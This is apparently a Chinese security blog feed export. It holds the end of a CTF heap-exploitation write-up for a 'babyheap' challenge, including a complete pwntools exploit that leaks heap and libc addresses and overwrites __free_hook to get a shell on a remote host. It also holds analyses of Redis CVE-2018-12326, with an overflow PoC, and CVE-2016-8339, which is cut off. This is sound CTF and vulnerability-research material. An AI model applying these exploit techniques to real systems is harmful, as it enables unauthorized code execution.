class="headerlink" title="第一步：思考 如何泄露出 libc 地址"></a>第一步：思考 如何泄露出 libc 地址</h4><p>由于我们需要最终需要知道 libc base 来构造最后的getshell payload。那么第一个思路是通过fake 一个chunk，让它分配到 unsortedbin 中，我们知道当一个chunk 在 unsortedbin中的时候，它的fd会指向 main_arena</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821173300.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821173300.png"></a></p><p>由于 UAF 漏洞的存在，我们这个时候去 show 这个chunk 的时候程序会将他 fd的内容打印出来。这个时候就能泄露出 libc地址。</p><p>但是要fake 一个chunk我们需要heap的地址。所以我们首先去 泄露  heap 地址。</p><h4 id="第二步-泄露-heap-地址。"><a href="#第二步-泄露-heap-地址。" class="headerlink" title="第二步 泄露 heap 地址。"></a>第二步 泄露 heap 地址。</h4><p>由于fastbins 的特性，我们连续 free 两个chunk，这个时候会产生一个 fastbins 的freelist。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821173736.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821173736.png"></a></p><p>这个时候 0x603000 的chunk 的fd 指向 0x603030 ，我们只需要 show 一下 0x603000这个chunk，就能得到heap地址：0x603030。<strong>注意，puts 存在截断，如果你是 0x603030  –&gt; 0x603000</strong> 会存在 leak 不出来的问题。所以注意 free 的顺序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#leak heap addr</span></span><br><span class="line">Show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(p.recvline()[ : <span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_addr:&#123;&#125;&#x27;</span>.format(hex(heap_addr)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="第三步-泄露libc-地址"><a href="#第三步-泄露libc-地址" class="headerlink" title="第三步 泄露libc 地址"></a>第三步 泄露libc 地址</h4><p>要 fake 个chunk 然后让它 free 之后被放到 unsortedbin ，我们可以考虑 fastbins attack + overlap 。</p><p>我们通过编辑 chunk 0 的 fd 让他指向 原本 fd-0x20的位置。当我们把 chunk 0 和 chunk 1 重新申请回来后。（fastbins的特性：后释放的，先被使用）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Edit(<span class="number">0</span>, p64(heap_addr + <span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line">Add(<span class="number">6</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">7</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>并修改 size 和fd等等。由于，chunk 6的fd被修改了，所以我们去修改 chunk 7的时候，其实就是在修改我们正常chunk的size。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x603020:       0x0000000000000000      0x0000000000000031       &lt;-- fake chunk</span><br><span class="line">0x603030:       0x0000000000000000      0x00000000000000a1       &lt;--- fake chunk size</span><br><span class="line">0x603040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603050:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603060:       0x0000000000000000      0x0000000000000031</span><br><span class="line">0x603070:       0x4343434343434343      0x0000000000000000</span><br><span class="line">0x603080:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603090:       0x0000000000000000      0x0000000000000031</span><br><span class="line">0x6030a0:       0x4444444444444444      0x0000000000000000</span><br><span class="line">0x6030b0:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>伪造后的 chunk 由于我们设置了 size 变大了，所以默认会把后面的 chunk 给吞并。我们 在设置基本块的时候要注意这个问题。</p><p>这个时候系统会认为 0x603020 这个伪造的 chunk 是存在的。所以当我们去 delete chunk 1。（由于chunk 1是后释放，所以申请到的chunk 7 指向的其实是同一个块）。系统会把 0x603020 放到unsortedbin中。（unsortedbin 不是fastbins 且不与 top chunk 紧邻，free后会被放置到unsortedbin中）</p><p>紧接着，我们只需要把这个 chunk free 了。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821173300.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821173300.png"></a></p><p>然后show，就能获得 libc base。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Edit(<span class="number">0</span>, p64(heap_addr + <span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line">Add(<span class="number">6</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">7</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Show(<span class="number">1</span>)</span><br><span class="line">libc_address = u64(p.recvline()[ : <span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_addr:&#123;&#125;&#x27;</span>.format(hex(libc_address)))</span><br></pre></td></tr></table></figure><h4 id="第四步-通过unlink-uaf-来获得一个任意地址写"><a href="#第四步-通过unlink-uaf-来获得一个任意地址写" class="headerlink" title="第四步 通过unlink + uaf  来获得一个任意地址写"></a>第四步 通过unlink + uaf  来获得一个任意地址写</h4><p>我们现在已经有了基本的信息。思路是修改 freehook 成one_gadget 。然后进行一次free就能getshell。</p><p>要达到这种效果，我们需要一个任意地址写。</p><p>我们之前 free chunk 1 来获得一个libc 地址，这个时候如果顺便同过 unlink 来获得一个 任意地址写不上刚好么。所以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Add(<span class="number">0</span>,<span class="string">&#x27;AAAAAAAA\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">1</span>,<span class="string">&#x27;BBBBBBBB\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">2</span>,<span class="string">&#x27;CCCCCCCC\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">3</span>,<span class="string">&#x27;DDDDDDDD\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(<span class="number">4</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(<span class="number">0x602080</span> - <span class="number">0x18</span>) + p64(<span class="number">0x602080</span> - <span class="number">0x10</span>))</span><br><span class="line">Add(<span class="number">5</span>, p64(<span class="number">0x30</span>) + p64(<span class="number">0x30</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>chunk 2 chunk 3 是用来修改 chunk1 size 让 chunk 1 来吞并的。当 free chunk 1的时候，我们构造好 unlink 的前提（现代 unlink 有检查。）fake 的 fd  == 0x602080-0x18 刚好是 ptr[] 数组中，chunk 1 的位置。也是之后 new chunk 4 的位置。</p><p>当通过unlink 后我们得到一个 chunk 指向了 chunk1 同时 chunk 4 也指向了 chunk1。 这个时候如果我们队chunk 1这块内存 写入 free_hook 的地址，然后再通过uaf 修改这个地址所指的值，写成一个 one_gadget 就能getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Edit(<span class="number">4</span>,p64(libc_address + <span class="number">0x3c67a8</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">Edit(<span class="number">1</span>, p64(libc_address + one_gadget)[:<span class="number">-1</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821180457.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821180457.png"></a></p><h3 id="0x03-完整-exp"><a href="#0x03-完整-exp" class="headerlink" title="0x03 完整 exp"></a>0x03 完整 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> mypwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p,elf,libc = init_pwn(<span class="string">&#x27;./babyheap&#x27;</span>,<span class="string">&#x27;./libc.so.6&#x27;</span>,remote_detail = (<span class="string">&#x27;106.75.67.115&#x27;</span>,<span class="number">9999</span>),is_env = <span class="literal">False</span>)</span><br><span class="line">breakpoint = [<span class="number">0x400D59</span>,<span class="number">0x400D65</span>,<span class="number">0x0400D7D</span>,<span class="number">0x400D71</span>]</span><br><span class="line">malloc_hook = <span class="number">0x3C4B10</span></span><br><span class="line">one_gadget = <span class="number">0x4526A</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">index, data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span>(<span class="params">index, data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(<span class="number">0</span>,<span class="string">&#x27;AAAAAAAA\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">1</span>,<span class="string">&#x27;BBBBBBBB\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">2</span>,<span class="string">&#x27;CCCCCCCC\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">3</span>,<span class="string">&#x27;DDDDDDDD\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(<span class="number">4</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(<span class="number">0x602080</span> - <span class="number">0x18</span>) + p64(<span class="number">0x602080</span> - <span class="number">0x10</span>))</span><br><span class="line">Add(<span class="number">5</span>, p64(<span class="number">0x30</span>) + p64(<span class="number">0x30</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap addr</span></span><br><span class="line">Show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(p.recvline()[ : <span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_addr:&#123;&#125;&#x27;</span>.format(hex(heap_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># # leak libc</span></span><br><span class="line"><span class="comment"># init_debug(p,breakpoint)</span></span><br><span class="line"><span class="comment"># raw_input(&#x27;wait to debug&#x27;)</span></span><br><span class="line">Edit(<span class="number">0</span>, p64(heap_addr + <span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line">Add(<span class="number">6</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">7</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Show(<span class="number">1</span>)</span><br><span class="line">libc_address = u64(p.recvline()[ : <span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_addr:&#123;&#125;&#x27;</span>.format(hex(libc_address)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">init_debug(p,breakpoint)</span><br><span class="line">raw_input(<span class="string">&#x27;wait to debug&#x27;</span>)</span><br><span class="line">Edit(<span class="number">4</span>,p64(libc_address + <span class="number">0x3c67a8</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">Edit(<span class="number">1</span>, p64(libc_address + one_gadget)[:<span class="number">-1</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 网鼎杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis CVE-2018-12326 分析</title>
      <link href="redis-CVE-2018-12326-analysis.html"/>
      <url>redis-CVE-2018-12326-analysis.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="redis-CVE-2018-12326-分析"><a href="#redis-CVE-2018-12326-分析" class="headerlink" title="redis CVE-2018-12326 分析"></a>redis CVE-2018-12326 分析</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>影响版本: Redis 3.2.x-3.2.4.</p><p>分析版本: 5.0, 4.0, 3.2</p><p>环境：ubuntu 17.10</p><h3 id="0x01-漏洞类型"><a href="#0x01-漏洞类型" class="headerlink" title="0x01 漏洞类型"></a>0x01 漏洞类型</h3><p>整型溢出导致缓冲区溢出</p><h3 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">cliRefreshPrompt</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (config.eval_ldb) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (config.hostsocket != <span class="literal">NULL</span>)</span><br><span class="line">        len = <span class="built_in">snprintf</span>(config.prompt,<span class="keyword">sizeof</span>(config.prompt),<span class="string">&quot;redis %s&quot;</span>,</span><br><span class="line">                       config.hostsocket);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        len = anetFormatAddr(config.prompt, <span class="keyword">sizeof</span>(config.prompt),</span><br><span class="line">                           config.hostip, config.hostport);</span><br><span class="line">    <span class="comment">/* Add [dbnum] if needed */</span></span><br><span class="line">    <span class="keyword">if</span> (config.dbnum != <span class="number">0</span>)</span><br><span class="line">        len += <span class="built_in">snprintf</span>(config.prompt+len,<span class="keyword">sizeof</span>(config.prompt)-len,<span class="string">&quot;[%d]&quot;</span>,</span><br><span class="line">            config.dbnum);</span><br><span class="line">    <span class="built_in">snprintf</span>(config.prompt+len,<span class="keyword">sizeof</span>(config.prompt)-len,<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当执行流到达</p><p><code>len = anetFormatAddr(config.prompt, sizeof(config.prompt), config.hostip, config.hostport);</code>的时候，参数长度由 anetFormatAddr决定。当我们的输入足够大的时候，<code>sizeof(config.prompt)-len</code> 变发生整型溢出</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180801180157.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180801180157.png"></a></p><p>如上图。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (config.dbnum != <span class="number">0</span>)</span><br><span class="line">        len += <span class="built_in">snprintf</span>(config.prompt+len,<span class="keyword">sizeof</span>(config.prompt)-len,<span class="string">&quot;[%d]&quot;</span>,</span><br><span class="line">            config.dbnum);</span><br><span class="line">    <span class="built_in">snprintf</span>(config.prompt+len,<span class="keyword">sizeof</span>(config.prompt)-len,<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序会通过  <code>snprintf</code>  这个函数向 <code>config.prompt+len</code>写入东西由于len是可控，所以我们可以向指定位置写入，但是写入的东西却是不可控的，他向 <code>config.prompt+len</code>    的位置写入的东西是 字符 <strong>&gt;</strong></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180801180515.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180801180515.png"></a></p><p>如图，由于写入参数不可控制，这个CVE 依旧无法做到任意代码执行。</p><h3 id="0x03-POC"><a href="#0x03-POC" class="headerlink" title="0x03 POC"></a>0x03 POC</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r  -h `python -c <span class="string">&#x27;print &quot;A&quot; * 340&#x27;</span>`</span><br></pre></td></tr></table></figure><h3 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h3><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180801180728.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180801180728.png"></a></p><p>修复后把len的获取修改了。</p><h3 id="0x05-疑问"><a href="#0x05-疑问" class="headerlink" title="0x05 疑问"></a>0x05 疑问</h3><p>这个CVE 在<a href="https://www.exploit-db.com/exploits/44904/">exp-db</a>的描述如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: Redis-cli &lt; 5.0 - Buffer Overflow (PoC)</span><br><span class="line"># Date: 2018-06-13</span><br><span class="line"># Exploit Author: Fakhri Zulkifli</span><br><span class="line"># Vendor Homepage: https://redis.io/</span><br><span class="line"># Software Link: https://redis.io/download</span><br><span class="line"># Version: 5.0, 4.0, 3.2</span><br><span class="line"># Fixed on: 5.0, 4.0, 3.2</span><br><span class="line"># CVE : CVE-2018-12326</span><br><span class="line"> </span><br><span class="line"># Buffer overflow in redis-cli of Redis version 3.2, 4.0, and 5.0 allows a local attacker</span><br><span class="line"># to achieve code execution and escalate to higher privileges via a long string in the hostname parameter.</span><br></pre></td></tr></table></figure><p>描述中说了可以 代码执行，但是在我的分析中，这个溢出似乎是不可控的。如果有人发现这个有代码执行的可能性或者方法请告知。</p><p>Emal: <code>bestswngs@gmail.com</code></p><h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> CVE-2018-12326 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis CVE-2016-8339 分析</title>
      <link href="Redis-CVE-2016-8339-analysis.html"/>
      <url>Redis-CVE-2016-8339-analysis.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h3 id="Redis-CVE-2016-8339-分析"><a href="#Redis-CVE-2016-8339-分析" class="headerlink" title="Redis CVE-2016-8339 分析"></a>Redis CVE-2016-8339 分析</h3><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>影响版本: Redis 3.2.x-3.2.4.</p><p>分析版本: Redis 3.2.0</p><p>环境：ubuntu 17.10</p><p><code>git  clone https://github.com/antirez/redis.git</code></p><p>切换到历史版本</p><p><code>git reset --hard 670586715a19e7aff </code></p><h3 id="0x01-漏洞类型：数组越界"><a href="#0x01-漏洞类型：数组越界" class="headerlink" title="0x01 漏洞类型：数组越界"></a>0x01 漏洞类型：数组越界</h3><p>数组下标越界导致溢出（Redis是使用标准C语言开发的）。</p><h3 id="0x02-漏洞原理："><a href="#0x02-漏洞原理：" class="headerlink" title="0x02 漏洞原理："></a>0x02 漏洞原理：</h3><p>在 Redis 中，<code>CONFIG SET parameter value</code> 命令可以动态的修改服务器配置，而无需重启。其中，有一条命令<code>CONFIG SET client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;  </code> 可以给当前未连接到服务端的某一类客户端设置”客户端输出缓冲区限制”。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* Finally set the new config */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; vlen; j += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> <span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> hard, soft;</span><br><span class="line">        <span class="keyword">int</span> soft_seconds;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> = <span class="title">getClientTypeByName</span>(<span class="title">v</span>[<span class="title">j</span>]);</span> <span class="comment">//返回值 -1 到 3</span></span><br><span class="line">        hard = strtoll(v[j+<span class="number">1</span>],<span class="literal">NULL</span>,<span class="number">10</span>);</span><br><span class="line">        soft = strtoll(v[j+<span class="number">2</span>],<span class="literal">NULL</span>,<span class="number">10</span>);</span><br><span class="line">        soft_seconds = strtoll(v[j+<span class="number">3</span>],<span class="literal">NULL</span>,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        server.client_obuf_limits[<span class="class"><span class="keyword">class</span>].<span class="title">hard_limit_bytes</span> = <span class="title">hard</span>;</span></span><br><span class="line">        server.client_obuf_limits[<span class="class"><span class="keyword">class</span>].<span class="title">soft_limit_bytes</span> = <span class="title">soft</span>;</span></span><br><span class="line">        server.client_obuf_limits[<span class="class"><span class="keyword">class</span>].<span class="title">soft_limit_seconds</span> = <span class="title">soft_seconds</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line">    sdsfreesplitres(v,vlen);</span><br><span class="line">&#125; config_set_special_field(<span class="string">&quot;notify-keyspace-events&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> flags = keyspaceEventsStringToFlags(o-&gt;ptr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (flags == <span class="number">-1</span>) <span class="keyword">goto</span> badfmt;</span><br><span class="line">    server.notify_keyspace_events = flags;</span><br></pre></td></tr></table></figure><p>通过 <code>getClientTypeByName </code>函数可以获取类型，我们转到这个函数的定义可以发现</p><figure class="highlight c"><table><tr><td 